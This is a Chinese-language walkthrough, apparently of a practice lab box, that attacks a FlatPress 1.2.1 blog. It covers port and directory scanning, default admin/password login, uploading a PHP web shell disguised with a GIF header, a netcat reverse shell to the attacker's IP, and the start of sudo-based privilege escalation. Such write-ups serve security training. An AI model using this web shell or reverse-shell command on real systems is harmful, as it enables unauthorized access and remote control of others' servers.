针对目标服务器进行相应的端口探测

```
sudo nmap -p- -vvv --min-rate 10000 192.168.167.29
```

![image-20241126213857973](https://s2.loli.net/2024/11/26/JR3pALuEov8CKO1.png)

针对开放的端口进行相应的服务探测

```
sudo nmap -p22,80,8089 -A 192.168.167.29 -oG Press.txt 
```

![image-20241126214845349](https://s2.loli.net/2024/11/26/T9vDplyeigEPjds.png)

22端口的SSH服务，没有相关的漏洞可以直接利用，我们重点关注80端口和8089两个端口的http服务

针对80端口进行相应相应的目录扫描

```
 dirsearch -u http://192.168.167.29/ -w /usr/share/wordlists/dirb/big.txt -f -e php,html,txt 
```

![image-20241126222739395](https://s2.loli.net/2024/11/26/LAEVvQFz6dm73ka.png)

针对8089端口，我们看到是由flatpress驱动的一个页面，我们优先检查是否存在默认认证权限或者可利用漏洞，同时针对目录进行相应的扫描

```
 dirsearch -u http://192.168.167.29:8089/
```

![image-20241126220327665](https://s2.loli.net/2024/11/26/yFWEP9uzOpx1neT.png)

![image-20241126215559502](https://s2.loli.net/2024/11/26/QfwIYEKsm5ZqA3H.png)

我们发现一个changelog.md文件，最新的一个版本为1.2.1，合理考虑当前版本即为1.2.1

![image-20241126220811882](https://s2.loli.net/2024/11/26/TRCM9sJ8tEDBfwG.png)

根据版本号，搜索相应的漏洞poc，搜索关键字：flatpress 1.2.1 exploit，确实存在漏洞，可以通过文件上传来实现RCE，不过还是需要登录

![image-20241126221258735](https://s2.loli.net/2024/11/26/NfWnCOuxtagLPRm.png)

我们开始考虑如何获取相应的登录路径，我通过Google搜索了flatpress default password 等关键词均没有直接的收获，我们使用下最默认的账号密码admin/admin，admin/password，结果后者的账号密码让我直接能够登录

admin/password

![image-20241126221942684](https://s2.loli.net/2024/11/26/q93yoO7EgXja54m.png)

我们既然可以登录了，那么针对这个版本我们就可以上传附件从而来实现相应的RCE(https://github.com/flatpressblog/flatpress/issues/152)，本地创建一个shell.php

```
GIF89a;
<?php system($_GET["cmd"]); ?>
```

![image-20241126222205410](https://s2.loli.net/2024/11/26/vU5hB7QrA1eyLwG.png)

访问相应的目录并进行命令执行

```
http://192.168.167.29:8089/fp-content/attachs/shell.php?cmd=id
```

![image-20241126222517303](https://s2.loli.net/2024/11/26/GHPtFTy9aecJVDu.png)

我们进行相应的shell反弹

```
http://192.168.167.29:8089/fp-content/attachs/shell.php?cmd=busybox nc 192.168.45.201 443 -e bash
```

![image-20241126222708024](https://s2.loli.net/2024/11/26/g5qWJomulD46Okr.png)

成功返回相应的shell，我们优先进行下bash升级工作

![image-20241126222939374](https://s2.loli.net/2024/11/26/jy85T4p7QazZCvu.png)

```
sudo -l
```

![image-20241126223222585](https://s2.loli.net/2024/11/26/PHljFVqrNITW3wf.png)

sudo apt-get changelog apt
